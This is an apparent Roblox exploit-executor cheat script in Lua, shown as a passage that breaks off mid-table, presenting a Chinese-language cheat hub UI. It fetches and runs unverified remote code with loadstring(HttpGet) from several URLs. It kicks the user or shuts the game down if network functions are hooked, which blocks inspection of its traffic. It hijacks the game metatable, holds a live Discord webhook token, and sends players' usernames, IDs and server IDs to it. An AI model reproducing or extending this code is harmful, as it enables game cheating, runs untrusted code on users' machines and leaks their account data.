local RandomMessage = `[{math.random()}]`
local Passed = false

game:GetService("LogService").MessageOut:Connect(function(Message, MessageType)
	if Message == RandomMessage and MessageType == Enum.MessageType.MessageOutput then
		Passed = true
	end
end)

print(RandomMessage)

repeat
	task.wait()
until Passed

local function probeArith()
    local chunk, _ = loadstring([[
        local a = "hello"
        local b = 2
        return a - b
    ]])
    if not chunk then return false end

    local ok, _ = pcall(chunk)
    return not ok        
end

local function probeCall()
    local ok, _ = pcall(function() (nil)() end)
    return not ok
end

local function probeFS()
    local ok, _ = pcall(function()
        if not isfolder("BS_script") then makefolder("BS_script") end
        if not isfolder("BS_script/Music") then makefolder("BS_script/Music") end
    end)
    return ok and isfolder("BS_script/Music")
end

local function coreLogic()

local shit=function()pcall(function()game.Players.LocalPlayer:Kick()end)pcall(game.Shutdown,game)end

local fuck=function()return"a"end
hookfunction(fuck,function()return"b"end)
if not isfunctionhooked then shit()return end
if not isfunctionhooked(fuck)then shit()return end

local bitch=game.HttpGet
hookfunction(bitch,function()end)
if not isfunctionhooked(bitch)then shit()return end
restorefunction(bitch)
if isfunctionhooked(bitch)then shit()return end

local cunt=request or http_request or(syn and syn.request)or(fluxus and fluxus.request)

spawn(function()
    while task.wait(0.5)do
        pcall(function()
            if isfunctionhooked(game.HttpGet)then shit()end
            if isfunctionhooked(game.HttpPost)then shit()end
            if isfunctionhooked(tostring)then shit()end
            if isfunctionhooked(setclipboard)then shit()end
            if cunt and isfunctionhooked(cunt)then shit()end
            if isfolder("HttpGetFolder")or isfolder("WebhookFolder")or isfolder("RequestFolder")then shit()end
        end)
    end
end)

for _,dick in pairs({"rconsoleprint","rconsolewarn","rconsoleinfo","rconsoleerr","rconsoletitle","clonefunction"})do
    getgenv()[dick]=nil
end

local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 0.843, 0)  -- 金色背景
LBL.BackgroundTransparency = 1  -- 背景透明
LBL.BorderColor3 = Color3.new(1, 0.843, 0)  -- 金色边框
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 0.843, 0)  -- 金色文字
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
  LastIteration = tick()
  for Index = #FrameUpdateTable, 1, -1 do
    FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
  end
  FrameUpdateTable[1] = LastIteration
  local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
  CurrentFPS = CurrentFPS - CurrentFPS % 1
  FpsLabel.Text = ("vip时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S").."秒")
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)

    --Kenny泛滥外部汉化脚本我的哔站UID:1531514159（删了这个死妈死爹死全家）
local Translations = {
    ["Close Window"] = "关闭窗口",
    ["Do you want to close this window? You will not be able to open it again."]= "求你了别关脚本😭😭",
    ["Cancel"]= "取消",
    ["Close Window"]= "关闭窗口",
    ["Locked"] = "锁定",
    ["Search"] = "搜索",
}

local function translateText(text)
    if not text or type(text) ~= "string" then return text end
    
    if Translations[text] then
        return Translations[text]
    end
    
    for en, cn in pairs(Translations) do
        if text:find(en) then
            return text:gsub(en, cn)
        end
    end
    
    return text
end

local function setupTranslationEngine()
    local success, err = pcall(function()
        local oldIndex = getrawmetatable(game).__newindex
        setreadonly(getrawmetatable(game), false)
        
        getrawmetatable(game).__newindex = newcclosure(function(t, k, v)
            if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then
                v = translateText(tostring(v))
            end
            return oldIndex(t, k, v)
        end)
        
        setreadonly(getrawmetatable(game), true)
    end)
    
    if not success then
        warn("元表劫持失败:", err)
       
        local translated = {}
        local function scanAndTranslate()
            for _, gui in ipairs(game:GetService("CoreGui"):GetDescendants()) do
                if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
                    pcall(function()
                        local text = gui.Text
                        if text and text ~= "" then
                            local translatedText = translateText(text)
                            if translatedText ~= text then
                                gui.Text = translatedText
                                translated[gui] = true
                            end
                        end
                    end)
                end
            end
            
            local player = game:GetService("Players").LocalPlayer
            if player and player:FindFirstChild("PlayerGui") then
                for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
                    if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
                        pcall(function()
                            local text = gui.Text
                            if text and text ~= "" then
                                local translatedText = translateText(text)
                                if translatedText ~= text then
                                    gui.Text = translatedText
                                    translated[gui] = true
                                end
                            end
                        end)
                    end
                end
            end
        end
        
        local function setupDescendantListener(parent)
            parent.DescendantAdded:Connect(function(descendant)
                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                    task.wait(0.1)
                    pcall(function()
                        local text = descendant.Text
                        if text and text ~= "" then
                            local translatedText = translateText(text)
                            if translatedText ~= text then
                                descendant.Text = translatedText
                            end
                        end
                    end)
                end
            end)
        end
        
        pcall(setupDescendantListener, game:GetService("CoreGui"))
        local player = game:GetService("Players").LocalPlayer
        if player and player:FindFirstChild("PlayerGui") then
            pcall(setupDescendantListener, player.PlayerGui)
        end
        
        while true do
            scanAndTranslate()
            task.wait(3)
        end
    end
end

task.wait(2)

setupTranslationEngine()

local success, err = pcall(function()

__SECROVIA__ = "你看你妈呢我拿那个鼠标"
__LUMINARIA__ = "乱七八糟的中文"
__OBFUSCATE__ = "看不懂的内容🤣😂"

end)

if not success then
    warn("加载失败:", err)
end

local function InjectSnow(targetTitle)
    local RunService = game:GetService("RunService")
    local CoreGui = (gethui and gethui()) or game:GetService("CoreGui")

    local function FindMainFrame()
        for _, v in pairs(CoreGui:GetDescendants()) do
            if v:IsA("TextLabel") and v.Text == targetTitle then
                local p = v.Parent
                while p and not (p:IsA("CanvasGroup") or (p:IsA("Frame") and p.Size.X.Offset > 300)) do
                    p = p.Parent
                    if p == CoreGui then break end
                end
                return p
            end
        end
        return nil
    end

    task.spawn(function()
        local mainFrame = nil
        for i = 1, 40 do
            mainFrame = FindMainFrame()
            if mainFrame then break end
            task.wait(0.5)
        end

        if not mainFrame then 
            warn("未找到窗口: " .. targetTitle)
            return 
        end
        local SnowCanvas = Instance.new("Frame")
        SnowCanvas.Name = "SnowCanvas_Balanced"
        SnowCanvas.Size = UDim2.fromScale(1, 1)
        SnowCanvas.BackgroundTransparency = 1
        SnowCanvas.ClipsDescendants = true
        SnowCanvas.ZIndex = 5
        SnowCanvas.Active = false
        SnowCanvas.Parent = mainFrame

        local flakes = {}
        local flakeCount = 45
        for i = 1, flakeCount do
            local flake = Instance.new("TextLabel")
            flake.Text = "❄️"
            flake.BackgroundTransparency = 1
            flake.TextTransparency = math.random(2, 6) / 10
            flake.Size = UDim2.fromOffset(math.random(12, 20), math.random(12, 20))
            flake.TextScaled = true
            flake.Position = UDim2.new(math.random(), 0, math.random(), 0)
            flake.Active = false
            flake.ZIndex = 5
            flake.Parent = SnowCanvas
            
            table.insert(flakes, {
                obj = flake,
                speed = math.random(10, 30) / 100,
            })
        end
        RunService.RenderStepped:Connect(function()
            if not mainFrame.Visible or not mainFrame.Parent then return end          
            
            for _, f in ipairs(flakes) do
                local pos = f.obj.Position
                local newY = pos.Y.Scale + (f.speed * 0.005)
                local newX = pos.X.Scale + (math.sin(tick() + f.speed) * 0.001)
                
                if newY > 1 then
                    newY = -0.1
                    newX = math.random()
                end
                f.obj.Position = UDim2.new(newX, 0, newY, 0)
            end
        end)
    end)
end

local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/sw/refs/heads/main/main.lua"))()

local musicId = "rbxassetid://4590662766"
local sound = Instance.new("Sound")
sound.Name = "SinglePlayMusic"
sound.SoundId = musicId
sound.Volume = 2
sound.Looped = false
sound.Parent = game:GetService("SoundService")

if not sound.IsLoaded then
    sound.Loaded:Wait()
end
sound:Play()
sound.Ended:Connect(function()
    sound:Destroy()
end)

local COLOR_SCHEMES = {
    ["彩虹颜色"] = {
        ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromHex("FF0000")),
            ColorSequenceKeypoint.new(0.16, Color3.fromHex("FFA500")),
            ColorSequenceKeypoint.new(0.33, Color3.fromHex("FFFF00")),
            ColorSequenceKeypoint.new(0.5, Color3.fromHex("00FF00")),
            ColorSequenceKeypoint.new(0.66, Color3.fromHex("0000FF")),
            ColorSequenceKeypoint.new(0.83, Color3.fromHex("4B0082")),
            ColorSequenceKeypoint.new(1, Color3.fromHex("EE82EE"))
        }),
        "palette"
    },
    -- 其他颜色方案...
}

local rainbowBorderAnimation
local currentBorderColorScheme = "彩虹颜色"
local borderInitialized = false
local animationSpeed = 2
local borderEnabled = true

-- 创建彩虹边框
local function createRainbowBorder(window, colorScheme, speed)
    if not window or not window.UIElements then
        wait(1)
        if not window or not window.UIElements then
            return nil, nil
        end
    end
    
    local mainFrame = window.UIElements.Main
    if not mainFrame then
        return nil, nil
    end
    
    local existingStroke = mainFrame:FindFirstChild("RainbowStroke")
    if existingStroke then
        local glowEffect = existingStroke:FindFirstChild("GlowEffect")
        if glowEffect then
            local schemeData = COLOR_SCHEMES[colorScheme or currentBorderColorScheme]
            if schemeData then
                glowEffect.Color = schemeData[1]
            end
        end
        return existingStroke, rainbowBorderAnimation
    end
    
    -- 添加圆角
    if not mainFrame:FindFirstChildOfClass("UICorner") then
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 16)
        corner.Parent = mainFrame
    end
    
    -- 创建边框描边
    local rainbowStroke = Instance.new("UIStroke")
    rainbowStroke.Name = "RainbowStroke"
    rainbowStroke.Thickness = 1.5
    rainbowStroke.Color = Color3.new(1, 1, 1)
    rainbowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    rainbowStroke.LineJoinMode = Enum.LineJoinMode.Round
    rainbowStroke.Enabled = borderEnabled
    rainbowStroke.Parent = mainFrame
    
    -- 添加渐变效果
    local glowEffect = Instance.new("UIGradient")
    glowEffect.Name = "GlowEffect"
    
    local schemeData = COLOR_SCHEMES[colorScheme or currentBorderColorScheme]
    if schemeData then
        glowEffect.Color = schemeData[1]
    else
        glowEffect.Color = COLOR_SCHEMES["彩虹颜色"][1]
    end
    
    glowEffect.Rotation = 0
    glowEffect.Parent = rainbowStroke
    
    return rainbowStroke, nil
end

-- 启动边框动画
local function startBorderAnimation(window, speed)
    if not window or not window.UIElements then
        return nil
    end
    
    local mainFrame = window.UIElements.Main
    if not mainFrame then
        return nil
    end
    
    local rainbowStroke = mainFrame:FindFirstChild("RainbowStroke")
    if not rainbowStroke or not rainbowStroke.Enabled then
        return nil
    end
    
    local glowEffect = rainbowStroke:FindFirstChild("GlowEffect")
    if not glowEffect then
        return nil
    end
    
    if rainbowBorderAnimation then
        rainbowBorderAnimation:Disconnect()
        rainbowBorderAnimation = nil
    end
    
    local animation
    animation = game:GetService("RunService").Heartbeat:Connect(function()
        if not rainbowStroke or rainbowStroke.Parent == nil or not rainbowStroke.Enabled then
            animation:Disconnect()
            return
        end
        
        local time = tick()
        glowEffect.Rotation = (time * speed * 60) % 360
    end)
    
    rainbowBorderAnimation = animation
    return animation
end

-- 初始化彩虹边框
local function initializeRainbowBorder(scheme, speed)
    speed = speed or animationSpeed
    
    local rainbowStroke, _ = createRainbowBorder(Window, scheme, speed)
    if rainbowStroke then
        if borderEnabled then
            startBorderAnimation(Window, speed)
        end
        borderInitialized = true
        return true
    end
    return false
end

-- 在UI创建后初始化边框
if not borderInitialized then
    spawn(function()
        wait(0.5)
        initializeRainbowBorder("彩虹颜色", animationSpeed)
    end)
end

-- 创建金色主题
WindUI:AddTheme({
    Name = "GoldenTheme",
    Accent = Color3.fromHex("#FFD700"),      -- 金色主色调
    Dialog = Color3.fromHex("#2a2a2a"),
    Outline = Color3.fromHex("#FFA500"),     -- 橙色边框
    Text = Color3.fromHex("#FFFFFF"),
    Placeholder = Color3.fromHex("#888888"),
    Background = Color3.fromHex("#1a1a1a"),
    Button = Color3.fromHex("#4a3a1a"),      -- 金色系按钮
    Icon = Color3.fromHex("#FFD700")         -- 金色图标
})

WindUI.TransparencyValue = 0.2
WindUI:SetTheme("GoldenTheme")  -- 应用金色主题

local function gradient(text, startColor, endColor)
    local result = ""
    for i = 1, #text do
        local t = (i - 1) / (#text - 1)
        local r = math.floor((startColor.R + (endColor.R - startColor.R) * t) * 255)
        local g = math.floor((startColor.G + (endColor.G - startColor.G) * t) * 255)
        local b = math.floor((startColor.B + (endColor.B - startColor.B) * t) * 255)
        result = result .. string.format('<font color="rgb(%d,%d,%d)">%s</font>', r, g, b, text:sub(i, i))
    end
    return result
end

local Window = WindUI:CreateWindow({
    Title = '<font color="#00FF00">刘某脚本</font>    ',  
    Icon = "badge-check",
    Author = "作者:刘某",
    Folder = "WindUI_Example",
    Size = UDim2.fromOffset(300, 350),
    Theme = "Dark",
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function()
            WindUI:Notify({
                Title = "点这干啥",
                Content = "点了没有用",
                Duration = 3
            })
        end
    },
    SideBarWidth = 220,
    ScrollBarEnabled = true,
    HideSearchBar = false,
    Background = 'rbxassetid://117645426728324'
})

InjectSnow('<font color="#00FF00">刘某脚本</font>    ')

Window:EditOpenButton({
    Title = "打开刘某脚本",
    Icon = "crown",
    CornerRadius = UDim.new(1, 1),
    StrokeThickness = 2,
    Color = ColorSequence.new(
        Color3.fromHex("#FFD700"),  
        Color3.fromHex("#FFA500")   
    ),
    OnlyMobile = false,
    Enabled = true,
    Draggable = true,
    Size = UDim2.new(0, 150, 0, 40)
})

Window:Tag({
    Title = "v4.1",
    Color = Color3.fromHex("#30ff6a")
})

Window:Tag({
    Title = "正式版",
    Color = Color3.fromHex("#FFD700")  -- 金色标签
})

local TimeTag = Window:Tag({
    Title = "00:00",
    Color = Color3.fromHex("#30ff6a"),
})

task.spawn(function()
    while true do
        for i = 0, 100 do
            local hue = i / 100
            TimeTag:SetColor(Color3.fromHSV(hue, 1, 1))
            TimeTag:SetTitle(os.date("%H:%M"))
            task.wait(0.06)
        end
    end
end)

spawn(function()
    while true do
        for hue = 0, 1, 0.01 do  
            local color = Color3.fromHSV(hue, 0.8, 1)  
            Window:EditOpenButton({
                Color = ColorSequence.new(color)
            })
            wait(0.04)  
        end
    end
end)
if not borderInitialized then
    spawn(function()
        wait(0.5)
        initializeRainbowBorder("彩虹颜色", animationSpeed)
        wait(1)
        applyFontStyleToWindow(currentFontStyle)
    end)
end

local windowOpen = true

Window:OnClose(function()
    windowOpen = false
    if rainbowBorderAnimation then
        rainbowBorderAnimation:Disconnect()
        rainbowBorderAnimation = nil
    end
end)

local originalOpenFunction = Window.Open
Window.Open = function(...)
    windowOpen = true
    local result = originalOpenFunction(...)
    
    if borderInitialized and borderEnabled and not rainbowBorderAnimation then
        wait(0.1)
        startBorderAnimation(Window, animationSpeed)
    end
    
    return result
end

Window:CreateTopbarButton("theme-switcher", "moon", function()
    WindUI:SetTheme(WindUI:GetCurrentTheme() == "Dark" and "GoldenTheme" or "Dark")
    WindUI:Notify({
        Title = "主题已更改",
        Content = "当前主题: "..WindUI:GetCurrentTheme(),
        Duration = 2
    })
end, 990)

local Tabs = {
    Settings = Window:Section({ Title = "界面", Opened = false }),
}

local TabHandles = {
    Appearance = Tabs.Settings:Tab({ Title = "颜色", Icon = "brush" }),
}

TabHandles.Appearance:Paragraph({
    Title = "自定义界面",
    Desc = "个性化您的体验",
    Image = "palette",
    ImageSize = 20,
    Color = "White"
})

local themes = {}
for themeName, _ in pairs(WindUI:GetThemes()) do
    table.insert(themes, themeName)
end
table.sort(themes)

local themeDropdown = TabHandles.Appearance:Dropdown({
    Title = "颜色",
    Values = themes,
    Value = "Dark",
    Callback = function(theme)
        WindUI:SetTheme(theme)
        WindUI:Notify({
            Title = "主题已应用",
            Content = theme,
            Icon = "crown",
            Duration = 2
        })
    end
})

local transparencySlider = TabHandles.Appearance:Slider({
    Title = "透明度",
    Value = { 
        Min = 0,
        Max = 1,
        Default = 0.2,
    },
    Step = 0.1,
    Callback = function(value)
        Window:ToggleTransparency(tonumber(value) > 0)
        WindUI.TransparencyValue = tonumber(value)
    end
})

TabHandles.Appearance:Toggle({
    Title = "启用深色模式",
    Desc = "使用深色配色方案",
    Value = true,
    Callback = function(state)
        WindUI:SetTheme(state and "GoldenTheme" or "Light")
        themeDropdown:Select(state and "GoldenTheme" or "Light")
    end
})

TabHandles.Appearance:Button({
    Title = "创建新主题",
    Icon = "plus",
    Callback = function()
        Window:Dialog({
            Title = "创建主题",
            Content = "此功能即将推出！",
            Buttons = {
                {
                    Title = "确定",
                    Variant = "Primary"
                }
            }
        })
    end
})

local Tab = Window:Tab({
    Title = "简介",
    Icon = "app-window",
    Locked = false,
    Opened = true,
})

Tab:Select() -- Select Tab

local Section = Tab:Section({ 
    Title = "制作者:刘某",
    TextXAlignment = "Left",
    TextSize = 30
})

local Section = Tab:Section({ 
    Title = "合作者:一眼鸡",
    TextXAlignment = "Left",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "QQ群:1070646590",
    TextXAlignment = "Left",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "QQ群:1070646590",
    Desc = "点击复制",
    Locked = false,
    Callback = function()
        local groupKey = "1070646590"  -- 这里填写你的QQ群号
        if setclipboard then
            setclipboard(groupKey)
            WindUI:Notify({
                Title = "群号已复制",
                Content = "群号: " .. groupKey,
                Icon = "crown",
                Duration = 3
            })
            print("已复制群号: " .. groupKey)
        else
            WindUI:Notify({
                Title = "错误",
                Content = "复制功能不可用",
                Icon = "crown",
                Duration = 3
            })
        end
    end
})

local Tab = Window:Tab({
    Title = "发送意见给刘某",
    Icon = "calendar-check",
    Locked = false,
    Opened = true,
})
        
-- ====================== 玩家交互-Tab3 消息发送功能【优化版】 ======================
Tab:Section({Title = "消息发送功能", Opened = true})

local messageHistory = {} -- 消息历史记录
local LocalPlayer = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local lastSendTime = 0 -- 上次发送时间（用于频率限制）
local MESSAGE_COOLDOWN = 10 -- 发送冷却时间（秒）

-- 尝试加载历史记录
pcall(function()
    if readfile and writefile then
        local success, data = pcall(function()
            return HttpService:JSONDecode(readfile("windui_message_history.json"))
        end)
        if success and type(data) == "table" then
            messageHistory = data
        end
    end
end)

-- 保存历史记录函数
local function saveMessageHistory()
    if writefile and #messageHistory > 0 then
        pcall(function()
            -- 只保存最近50条记录
            local toSave = {}
            local startIndex = math.max(1, #messageHistory - 49)
            for i = startIndex, #messageHistory do
                table.insert(toSave, messageHistory[i])
            end
            writefile("windui_message_history.json", HttpService:JSONEncode(toSave))
        end)
    end
end

-- 1. 消息输入框 - 使用变量引用以便后续操作
local messageInput = Tab:Input({
    Title = "输入要发送的消息",
    Value = "",
    Placeholder = "在此输入消息内容...",
    Callback = function(value)
        -- 实时存储输入内容
        if value and type(value) == "string" then
            messageContent = value
        else
            messageContent = ""
        end
    end
})

-- 2. 发送消息按钮【优化版】
Tab:Button({
    Title = "发送消息",
    Icon = "send",
    Description = "将消息发送到Discord频道",
    Callback = function()
        -- 频率限制检查
        local currentTime = os.time()
        if currentTime - lastSendTime < MESSAGE_COOLDOWN then
            local remaining = MESSAGE_COOLDOWN - (currentTime - lastSendTime)
            WindUI:Notify({
                Title = "发送过于频繁", 
                Content = string.format("请等待 %d 秒后再发送", remaining), 
                Icon = "clock", 
                Duration = 3
            })
            return
        end
        
        -- 获取并处理消息内容
        local msg = messageContent or ""
        msg = msg:gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")
        
        -- 输入验证
        if msg == "" then
            WindUI:Notify({
                Title = "消息为空", 
                Content = "请输入要发送的消息内容", 
                Icon = "alert-circle", 
                Duration = 3
            })
            return
        end
        
        if #msg > 2000 then
            WindUI:Notify({
                Title = "消息过长", 
                Content = string.format("消息长度 %d/2000 字符", #msg), 
                Icon = "type", 
                Duration = 3
            })
            return
        end
        
        -- 敏感词过滤（基础版）
        local blockedWords = {"密码", "token", "key", "admin", "作弊"}
        local lowerMsg = msg:lower()
        for _, word in ipairs(blockedWords) do
            if lowerMsg:find(word:lower()) then
                WindUI:Notify({
                    Title = "内容受限", 
                    Content = "消息包含受限内容，请修改后重试", 
                    Icon = "shield-off", 
                    Duration = 3
                })
                return
            end
        end
        
        -- 获取玩家信息（带错误处理）
        local pName, pId, dName = "未知", 0, "未知"
        local success, playerInfo = pcall(function()
            pName = LocalPlayer.Name
            pId = LocalPlayer.UserId
            dName = LocalPlayer.DisplayName
            return true
        end)
        
        if not success then
            WindUI:Notify({
                Title = "玩家信息获取失败", 
                Content = "无法获取当前玩家信息", 
                Icon = "user-x", 
                Duration = 3
            })
            return
        end
        
        -- 获取游戏信息
        local gameName, gameId = "未知游戏", game.PlaceId
        pcall(function()
            local productInfo = MarketplaceService:GetProductInfo(gameId)
            if productInfo and productInfo.Name then
                gameName = productInfo.Name
            end
        end)
        
        -- 构建Discord Webhook消息
        local timestamp = os.date("%Y-%m-%d %H:%M:%S")
        local truncatedMsg = #msg > 1000 and msg:sub(1, 1000) .. "..." or msg
        
        local webhookData = {
            username = "刘某脚本消息系统",
            avatar_url = "https://cdn.discordapp.com/attachments/1468097591618048013/1468111096052318333/Image_1769086221054_853.png?ex=6982d481&is=69818301&hm=c8266a7ce1211220a7714fdc2b886acaa884abe348b41b9bc87cbd092e23916b&",
            embeds = {{
                color = 3447003,
                title = "📨 新消息通知",
                description = string.format("**玩家发送了消息**\n\n📝 内容：```%s```", truncatedMsg),
                thumbnail = {
                    url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", pId)
                },
                fields = {
                    {
                        name = "👤 发送者信息",
                        value = string.format("用户名: %s\n显示名: %s\n用户ID: %d", pName, dName, pId),
                        inline = true
                    },
                    {
                        name = "🕐 时间信息",
                        value = string.format("发送时间: %s\n游戏时间: %s", timestamp, game:GetService("Workspace").DistributedGameTime),
                        inline = true
                    },
                    {
                        name = "🎮 游戏信息",
                        value = string.format("游戏ID: %d\n游戏名称: %s\n服务器ID: %s", 
                            gameId, gameName, game.JobId),
                        inline = false
                    }
                },
                footer = {
                    text = "刘某脚本 • 消息系统",
                    icon_url = "https://cdn.discordapp.com/attachments/1468097591618048013/1468111096052318333/Image_1769086221054_853.png?ex=6982d481&is=69818301&hm=c8266a7ce1211220a7714fdc2b886acaa884abe348b41b9bc87cbd092e23916b&"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        
        -- 多执行器兼容的网络请求
        local reqFunc = nil
        local executors = {
            syn = syn and syn.request,
            fluxus = fluxus and fluxus.request,
            request = request,
            http_request = http_request,
            http = http and http.request
        }
        
        for _, func in pairs(executors) do
            if type(func) == "function" then
                reqFunc = func
                break
            end
        end
        
        if not reqFunc then
            WindUI:Notify({
                Title = "执行器不支持", 
                Content = "当前执行器不支持网络请求功能", 
                Icon = "wifi-off", 
                Duration = 4
            })
            return
        end
        
        -- Discord Webhook URL
        local webhookUrl = "https://discord.com/api/webhooks/1468108097607172126/gLQm1hoN3Jsnlirk_t8zfgqVwUr_7AdEtLCGqQO5oNi2E7nJgrJOudijClcsuqpGwvc8"
        
        -- 显示发送中状态
        WindUI:Notify({
            Title = "发送中...", 
            Content = "正在将消息发送到Discord", 
            Icon = "loader", 
            Duration = 2
        })
        
        -- 发送请求
        local requestSuccess, response = pcall(function()
            return reqFunc({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "WindUI-Message-System/1.0"
                },
                Body = HttpService:JSONEncode(webhookData)
            })
        end)
        
        -- 处理响应
        if requestSuccess then
            -- 更新发送时间
            lastSendTime = currentTime
            
            -- 添加到历史记录
            table.insert(messageHistory, {
                text = msg,
                time = currentTime,
                timestamp = timestamp,
                success = true
            })
            
            -- 保存历史记录
            saveMessageHistory()
            
            -- 清空输入框
            messageContent = ""
            if messageInput and messageInput.SetValue then
                messageInput:SetValue("")
            end
            
            WindUI:Notify({
                Title = "发送成功", 
                Content = "消息已成功发送到Discord频道", 
                Icon = "check-circle", 
                Duration = 3
            })
        else
            -- 记录失败
            table.insert(messageHistory, {
                text = msg,
                time = currentTime,
                timestamp = timestamp,
                success = false,
                error = "网络请求失败"
            })
            
            WindUI:Notify({
                Title = "发送失败", 
                Content = "消息发送失败，请检查网络连接", 
                Icon = "x-circle", 
                Duration = 4
            })
        end
    end
})

-- 3. 查看发送记录按钮【增强版】
Tab:Button({
    Title = "查看发送记录",
    Icon = "history",
    Description = "查看最近发送的消息记录",
    Callback = function()
        local text = "📋 **消息发送记录**\n\n"
        
        if #messageHistory == 0 then
            text = text .. "暂无发送记录\n\n开始发送你的第一条消息吧！"
        else
            -- 统计信息
            local total = #messageHistory
            local successCount = 0
            for _, m in ipairs(messageHistory) do
                if m.success then successCount = successCount + 1 end
            end
            
            text = text .. string.format("📊 统计: 共 %d 条，成功 %d 条\n\n", total, successCount)
            
            -- 显示最近5条记录
            local displayCount = math.min(5, #messageHistory)
            for i = #messageHistory, #messageHistory - displayCount + 1, -1 do
                local m = messageHistory[i]
                local t = os.date("%m-%d %H:%M", m.time)
                local status = m.success and "✅" or "❌"
                local pre = m.text:gsub("\n", " ")
                pre = #pre > 30 and pre:sub(1, 30) .. "..." or pre
                text = text .. string.format("%s [%s] %s\n", status, t, pre)
            end
            
            if #messageHistory > displayCount then
                text = text .. string.format("\n...还有 %d 条更早的记录", #messageHistory - displayCount)
            end
        end
        
        WindUI:Notify({
            Title = "消息记录", 
            Content = text, 
            Icon = "file-text", 
            Duration = 10
        })
    end
})

local Tab = Window:Tab({
    Title = "玩家意见反馈",
    Icon = "message-circle-reply",
    Locked = false,
    Opened = true,
})

local Section = Tab:Section({ 
    Title = "已经按照玩家要求添加了脚本",
    TextXAlignment = "Center",
    TextSize = 20
})

local Section = Tab:Section({ 
    Title = "添加服务器↓",
    TextXAlignment = "Center",
    TextSize = 18
})

local Section = Tab:Section({ 
    Title = "ohio",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "战争机器",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "压力",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "有两个服务器没加因为我不会玩也找不到现成的🤓",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "还更新了个音乐播放功能也是玩家反馈",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "还有别乱发消息我可是能看到你的所有信息的🤓",
    TextXAlignment = "Center",
    TextSize = 17
})

local Tab = Window:Tab({
    Title = "API汉化+绕过服务器",
    Icon = "",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "LM汉化API",
    Desc = "直接加载脚本",
    Locked = false,
    Callback = function()
        local redzlib = 

loadstring(game:HttpGet("https://raw.githubusercontent.com/lmlmlm7891/cnmsjwnrnmbdsmdx/refs/heads/main/红乌龟.lua"))()


local Window = redzlib:MakeWindow({

Title = "刘某脚本",

SubTitle = "作者:刘某",

SaveFolder = "testando | redz lib v5.lua"

})


Window:AddMinimizeButton({

Button = { Image = "rbxassetid://127617240901834", BackgroundTransparency = 0 },

Corner = { CornerRadius = UDim.new(35, 1) },

})


Window:SelectTab(Tab1)


local Tab1 = Window:MakeTab({"简介", ""})

local Tab2 = Window:MakeTab({"墨水游戏", ""})

local Tab3 = Window:MakeTab({"API汉化", ""})

local Tab4 = Window:MakeTab({"内脏与黑火药", ""})


Tab1:AddDiscordInvite({

Name = "我的QQ群",

Description = "加入",

Logo = "rbxassetid://18751483361",

Invite = "1070646590",

})


local Paragraph = Tab1:AddParagraph({"刘某脚本", "目前脚本持续更新中\n有什么想要的玩脚本请和我反馈🤓"})


local Paragraph = Tab1:AddParagraph({"API汉化", "优化了API汉化翻译慢的情况\n优化了翻译卡顿的情况\n修复了汉化无发关闭的情况"})


Tab2:AddButton({"Ringta汉化", function(Value)

loadstring(game:HttpGet("https://raw.githubusercontent.com/hdjsjjdgrhj/script-hub/refs/heads/main/Ringta"))()

end})


Tab2:AddButton({"ax汉化", function(Value)

--Kenny泛滥外部汉化脚本我的哔站UID:1531514159（删了这个死妈死爹死全家）

local Translations = {

--["这里填要替换的英文"] = "这里填中文",

["Toggle"] = "切换",

["AX-SCRIPTS"] = "AX脚本",

["Search"] = "搜索",

["Games"] = "游戏",

["Combat"] = "战斗",

["Miscs"] = "杂项",

["Players"] = "玩家",

["Guards"] = "防护",

["Settings"] = "设置",

["Jump Rope"] = "跳绳",

["Finish Jump Rope"] = "完成跳绳",

["Disable Game"] = "禁用游戏",

["Simulate Balance"] = "模拟平衡",

["Auto Jump"] = "自动跳跃",

["Fix Broken Tracks"] = "修复损坏轨道",

["Unlimited Chances"] = "无限机会",

